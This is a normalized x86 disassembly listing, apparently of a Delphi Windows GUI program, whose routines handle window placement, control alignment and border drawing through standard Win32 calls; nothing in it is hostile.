cmp bl [ esi + 0x1a4 ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x1a4 ] bl
mov eax esi
call sub_449088
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb028
mov eax esi
call sub_443750
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
and eax 0xfffeffff
test bl bl
je r-xdata
push eax
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call SetWindowLongA
or eax 0x10000
sub_449018
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_44907c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x1a7 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449083
lea eax [ ebp - 0x4 ]
call sub_4057e0
retn
mov [ ebx + 0x1a7 ] dl
test [ ebx + 0x1c ] 0x10
setne al
xor al 0x1
test al dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc6
call sub_403540
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x17c ]
call sub_4057f8
sub_449094
push ebx
push esi
push edi
add esp 0xffffffc4
mov ebx eax
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
je r-xdata
push esp
mov eax [ ebx + 0x180 ]
push eax
call GetWindowRect
mov [ esp + 0x10 ] 0x2c
lea eax [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea esi [ esp + 0x2c ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
mov eax [ esp ]
mov [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x44 ] eax
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ ebx + 0x48 ] eax
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_441ba4
add esp 0x3c
pop edi
pop esi
pop ebx
retn
push 0xfffffff8
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
mov esi eax
test esi esi
je r-xdata
push 0xfffffff0
mov eax [ ebx + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
push esp
push esi
call ScreenToClient
lea eax [ esp + 0x8 ]
push eax
push esi
call ScreenToClient
sub_44914c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x194 ]
test eax eax
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x4 ] 0x0
mov eax [ ebp + 0x194 ]
mov edx [ esp + 0x4 ]
call sub_4143bc
mov ebx eax
mov edx ebx
mov eax [ esp ]
call sub_414210
mov edx [ esp ]
mov eax ebx
mov si 0xffb4
call sub_403540
inc [ esp + 0x4 ]
dec edi
jne r-xdata
sub_4491ac
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_4492a2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb4
call sub_403540
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4492a9
mov eax [ ebp - 0x14 ]
call sub_403344
retn
mov edx edi
mov eax [ ebp - 0x14 ]
call sub_414418
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
mov ebx [ ebp - 0x10 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
inc ebx
mov eax [ ebp - 0x14 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_4143bc
mov edi eax
mov eax edi
mov si 0xffb8
call sub_403540
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x1a4 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov [ ebp - 0xc ] edi
mov eax [ edi + 0x30 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
sub_4492b8
push ebp
mov ebp esp
push esi
mov esi edx
mov edx [ ebp + 0x8 ]
push edx
xor dl 0x1
push edx
mov edx esi
call sub_4491ac
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_4492e4
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_45a2f0
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_4491ac
test eax eax
jne r-xdata
test eax eax
je r-xdata
push 0x0
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_4491ac
mov edx eax
mov eax esi
call sub_45e054
sub_449328
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_445ab4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_445a78
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_449370
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_448a2c
pop esi
pop ebx
retn
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4427c0
sub_4493b8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x74 ]
cmp [ eax + 0x14 ] 0x0
jbe r-xdata
xor edx edx
mov [ edi ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x14 ]
mov [ edi ] edx
jmp r-xdata
xor edx edx
mov [ ecx ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x10 ]
mov [ ecx ] edx
jmp r-xdata
cmp [ eax + 0x10 ] 0x0
jbe r-xdata
mov edx [ ebp + 0xc ]
xor ebx ebx
mov [ edx ] ebx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0xc ]
mov ebx [ ebp + 0xc ]
mov [ ebx ] edx
jmp r-xdata
cmp [ eax + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
mov eax [ esi + 0x74 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ eax + 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_44943c
push ebp
mov ebp esp
add esp 0xffffffa0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_449088
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax esi
call sub_445ab4
test eax eax
je r-xdata
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8c ]
lea eax [ ebp - 0x5d ]
push eax
call IsRectEmpty
test eax eax
jne r-xdata
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x55 ]
sub edx [ ebp - 0x5d ]
sub eax edx
mov [ ebp - 0xc ] eax
mov edx [ esi + 0x4c ]
mov ecx [ ebp - 0x51 ]
sub ecx [ ebp - 0x59 ]
sub edx ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
sub [ eax ] edx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
sub [ eax ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
sub [ eax ] edx
xor ecx ecx
push ebp
push sub_4497fe
push [ fs : ecx ]
mov [ fs : ecx ] esp
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_445ab4
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax ] edx
cmp [ ebp - 0x20 ] 0x0
jle r-xdata
inc edi
mov [ ebp - 0x1c ] 0x0
cmp [ ebp - 0x24 ] 0x0
jle r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx ]
jle r-xdata
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x48 ]
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_4493b8
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebp - 0x28 ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
sub al 0x2
jb r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
jle r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
cmp eax [ edx ]
jle r-xdata
mov [ ebp - 0x4d ] 0x0
jmp r-xdata
mov [ ebp - 0x4d ] 0x1
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
mov [ ebp - 0x4d ] 0x1
jmp r-xdata
sub al 0x2
je r-xdata
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_445a78
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
sub eax [ ebx + 0x48 ]
sub eax [ ebp - 0x40 ]
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x4d ] 0x2
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
add [ eax ] edx
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
add al 0xfe
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
add eax [ ebp - 0x44 ]
sub eax [ ebx + 0x48 ]
mov [ ebp - 0x44 ] eax
jmp r-xdata
mov [ ebp - 0x4d ] 0x3
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
add [ eax ] edx
xor eax eax
jmp r-xdata
mov al 0x1
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
mov al 0x1
jmp r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
mov dl [ ebp - 0x4d ]
dec edx
sub dl 0x2
jb r-xdata
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
sub edx [ ebx + 0x4c ]
sub edx [ ebp - 0x48 ]
mov [ ebp - 0x48 ] edx
mov al 0x2
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax ] edx
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
add edx [ ebp - 0x4c ]
sub edx [ ebx + 0x4c ]
mov [ ebp - 0x4c ] edx
jmp r-xdata
mov al 0x3
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x40 ]
jge r-xdata
mov edx [ ebx + 0x48 ]
add [ ebp - 0x30 ] edx
add [ ebp - 0x34 ] edx
jmp r-xdata
dec eax
sub al 0x2
jb r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x44 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x40 ]
mov [ edx ] ecx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x20 ]
jle r-xdata
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x44 ]
mov [ edx ] ecx
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x24 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ ebp - 0x20 ] edx
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x48 ]
jge r-xdata
mov eax [ ebx + 0x4c ]
add [ ebp - 0x38 ] eax
add [ ebp - 0x3c ] eax
jmp r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x4c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x48 ]
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x28 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4c ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x2c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x2c ] eax
jmp r-xdata
sub_449815
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_44943c
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4435ec
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_449854
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_444470
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0x74 ]
mov eax edi
call sub_441eb8
cmp [ edi + 0x158 ] 0x0
jne r-xdata
sub_44989c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_444690
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx [ ebx + 0x158 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_4498cc
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
call sub_449088
test al al
je r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb4 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax [ ebp - 0x4 ]
call sub_44561c
xor ecx ecx
push ebp
push sub_4499fb
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
call sub_445ab4
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_445ab4
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449a02
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_445624
retn
inc esi
mov [ ebp - 0x14 ] 0x0
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edi [ ebp - 0x28 ]
sub edi [ ebp - 0x38 ]
jmp r-xdata
add cl 0xfd
sub cl 0x2
jae r-xdata
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
sub dl 0x3
jae r-xdata
xor edi edi
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_445a78
cmp [ eax + 0x57 ] 0x0
jne r-xdata
xor edx edx
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x24 ]
sub edx [ ebp - 0x34 ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
sub ecx [ ebp - 0x18 ]
mov edx [ eax + 0x40 ]
sub edx edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_449a02
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
test al al
je r-xdata
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x28 ]
test eax eax
jle r-xdata
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x48 ]
mov ecx [ ebp - 0x30 ]
sub ecx [ ebp - 0x38 ]
sub eax ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] eax
cmp dl 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
sub al 0x3
jae r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x24 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_403540
jmp r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x4c ]
mov ecx [ ebp - 0x2c ]
sub ecx [ ebp - 0x34 ]
sub eax ecx
mov ecx [ ebp - 0xc ]
mov [ ecx ] eax
cmp dl 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_403540
jmp r-xdata
sub_449a98
sub edx 0x1
jb r-xdata
cmp cl [ eax + 0x163 ]
je r-xdata
je r-xdata
retn
mov [ eax + 0x163 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_443750
retn
cmp cl [ eax + 0x164 ]
je r-xdata
jmp r-xdata
mov [ eax + 0x164 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_443750
sub_449adc
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x162 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x162 ] al
push 0x0
xor ecx ecx
mov edx 0xb03b
mov eax ebx
call sub_443750
sub_449b4c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ esi + 0x8 ]
mov esi eax
mov eax [ ebx + 0x16c ]
neg eax
push eax
mov edx [ ebx + 0x16c ]
neg edx
push eax
mov edi esi
push edi
call InflateRect
cmp [ ebx + 0x165 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
xor eax eax
cmp [ ebx + 0x163 ] 0x0
je r-xdata
cmp [ ebx + 0x164 ] 0x0
je r-xdata
add eax [ ebx + 0x168 ]
mov esi edi
test [ ebx + 0x162 ] 0x1
je r-xdata
add eax [ ebx + 0x168 ]
test [ ebx + 0x162 ] 0x2
je r-xdata
add [ esi ] eax
test [ ebx + 0x162 ] 0x4
je r-xdata
add [ esi + 0x4 ] eax
test [ ebx + 0x162 ] 0x8
je r-xdata
sub [ esi + 0x8 ] eax
sub [ esi + 0xc ] eax
sub_449bdc
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
call GetWindowDC
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_449e42
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
call GetClientRect
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
call GetWindowRect
push 0x2
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call ExcludeClipRect
lea esi [ ebp - 0x2c ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
push eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call InflateRect
lea esi [ ebp - 0x1c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x16c ] 0x0
jbe r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call IntersectClipRect
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x2c ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_41d9fc
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call FillRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
call ReleaseDC
retn
xor ebx ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x163 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
call sub_436540
call sub_436620
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x164 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x52 ] 0x2
je r-xdata
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_448d84
push eax
call GetWindowLongA
mov esi eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
call sub_436540
xor ecx ecx
mov edx [ ebp - 0x4 ]
call sub_436d6c
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x2
je r-xdata
sub [ ebp - 0x2c ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x4
je r-xdata
sub [ ebp - 0x28 ] ebx
test esi 0x200000
je r-xdata
add [ ebp - 0x24 ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x8
je r-xdata
push 0x14
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x24 ] eax
test esi 0x100000
je r-xdata
add [ ebp - 0x20 ] ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x162 ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x165 ]
or eax [ edx * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x163 ]
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x164 ]
or eax [ edx * 4 + rw-data ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call DrawEdge
push 0x15
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x20 ] eax
sub_449e84
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
